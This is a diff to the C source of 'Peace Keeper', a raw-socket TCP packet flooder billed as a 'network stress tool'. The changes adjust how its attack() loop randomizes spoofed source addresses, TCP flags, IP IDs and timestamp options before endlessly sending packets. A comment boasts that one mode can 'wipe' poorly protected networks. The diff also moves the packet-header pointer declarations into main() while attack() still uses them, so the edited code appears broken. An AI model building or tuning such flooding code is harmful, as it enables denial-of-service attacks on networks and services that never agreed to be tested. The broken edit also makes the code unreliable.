@@ -36,6 +36,8 @@
 Peace Keeper: A TCP/IP IPv4 network stress tool.
 The traditional way of keeping the peace amongst the crowd.
 By darkness@efnet. // greetz vae@efnet.
+
+
 */
 
 #include <stdio.h>
@@ -54,7 +56,6 @@ By darkness@efnet. // greetz vae@efnet.
 #include <stdbool.h>
 
 // Code configuration, don't modify unless you know what you're doing!
-// Definitions.
 #define PHI						      0x3133742069	// Random number generation seed.
 #define MAX_PACKET_LEN				  8192			// Max IP packet length.
 #define EPHEMERAL_PORT_MIN            16383         // Min ephemeral TCP port randomization
@@ -73,10 +74,8 @@ By darkness@efnet. // greetz vae@efnet.
 #define IP_DF                         0x4000        // dont fragment flag 
 #define IP_MF                         0x2000        // more fragments flag 
 #define IP_OFFMASK                    0x1fff        // mask for fragmenting bits 
-#define MAX_TARGETS					  10			// How many target IPs can we packet at once.
 #define FLAGLIST_DIGITAL_GANGSTA      129           // Digital Gangsta Stomper.
 #define FLAGLIST_RAND_TCP             130           // Used to wipe basically any unprotected, or poorly configured protected networks.
-
 
 // Spoofing Type Triggers
 bool destFullSpoof = false;
@@ -169,11 +168,6 @@ struct icmp
     unsigned short int id;
     unsigned short int seq;
 };*/
-
-// Assemble Headers
-struct ip* pk_iphdr = (struct ip*)datagram;
-struct tcp* pk_tcphdr = (struct tcp*)(datagram + sizeof(struct ip));
-struct tcp_opt* pk_tcpopt = (struct tcp_opt*)(datagram + sizeof(struct ip) + sizeof(struct tcp));
 
 unsigned short csum(unsigned short* addr, int len)
 {
@@ -341,14 +335,14 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     pk_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
     pk_tcphdr->th_sum = pk_iphdr->ip_sum;
 
-#ifdef DEBUG_TCP
+    #ifdef DEBUG_TCP
     printf("> Loop IP HDR: %u\n", sizeof(struct ip));
     printf("> Loop TCP HDR: %u\n", sizeof(struct tcp));
     printf("> Loop TCP OPTHDR: %u\n", sizeof(struct tcp_opt));
     printf("> Loop Databytes: %u\n", databytes);
     printf("> Loopth_sum: %u\n", pk_tcphdr->th_sum);
     printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
-#endif
+    #endif
 
     while (true)
     {
@@ -416,6 +410,15 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
             pk_iphdr->ip_src.s_addr = srcaddr;
         }
 
+        // Randomize TSVal
+        pk_tcpopt->op8 = rand_cmwc();
+        pk_tcpopt->op9 = rand_cmwc();
+        pk_tcpopt->op10 = rand_cmwc();
+        pk_tcpopt->op11 = rand_cmwc();
+
+        // Randomize IP ID
+        pk_iphdr->ip_id = htons(rand_cmwc());
+
         // Flag randomizations.
         if (flags == FLAGLIST_RAND_TCP)
         {
@@ -425,6 +428,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         {
             pk_tcphdr->th_flags = a_flags[(rand_cmwc() % 11) + 1];
         }
+
         // If packet flag is SYN, set TCP-ACK and TCP-SEQ accordingly.
         if (pk_tcphdr->th_flags == 2)
         {
@@ -436,15 +440,6 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
             pk_tcphdr->th_seq = htonl(rand_cmwc());
             pk_tcphdr->th_ack = htonl(rand_cmwc());
         }
-
-        // Randomize TSVal
-        pk_tcpopt->op8 = rand_cmwc();
-        pk_tcpopt->op9 = rand_cmwc();
-        pk_tcpopt->op10 = rand_cmwc();
-        pk_tcpopt->op11 = rand_cmwc();
-
-        // Randomize IP ID
-        pk_iphdr->ip_id = htons(rand_cmwc());
 
         // Randomize winsize
         if (winsize == 1)
@@ -490,17 +485,18 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         pk_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
         pk_tcphdr->th_sum = pk_iphdr->ip_sum;
 
-#ifdef DEBUG_TCP
+        #ifdef DEBUG_TCP
         printf("> Loop IP HDR: %u\n", sizeof(struct ip));
         printf("> Loop TCP HDR: %u\n", sizeof(struct tcp));
         printf("> Loop TCP OPTHDR: %u\n", sizeof(struct tcp_opt));
         printf("> Loop Databytes: %u\n", databytes);
         printf("> Loopth_sum: %u\n", pk_tcphdr->th_sum);
         printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
-#endif
+        #endif
 
         // Send our newly modified loop packet.
-        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
+        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin));
+        packets++;
     }
 }
 
@@ -545,6 +541,13 @@ int main(int argc, char** argv)
         printf("setsockopt(): cannot set HDRINCL, die.\n");
         exit(-1);
     }
+
+    // Assemble Headers
+    struct ip* pk_iphdr = (struct ip*)datagram;
+    struct tcp* pk_tcphdr = (struct tcp*)(datagram + sizeof(struct ip));
+    struct tcp_opt* pk_tcpopt = (struct tcp_opt*)(datagram + sizeof(struct ip) + sizeof(struct tcp));
+    //struct udp* pk_udphdr = (struct udp*)(datagram + sizeof(struct ip));
+    //struct icmp* pk_icmphdr = (struct icmp*)(datagram + sizeof(struct ip));
 
     // Parse input.
     pktqueue = atoi(argv[2]);
@@ -669,8 +672,8 @@ int main(int argc, char** argv)
         a_flags[7] = 16;     // ACK
         a_flags[8] = 16;     // ACK
         a_flags[9] = 16;     // ACK
-        a_flags[10] = 16;     // ACK
-        a_flags[11] = 1;      // FIN
+        a_flags[10] = 16;    // ACK
+        a_flags[11] = 1;     // FIN
     }
 
     // Let them know what packet randomization is taking place.
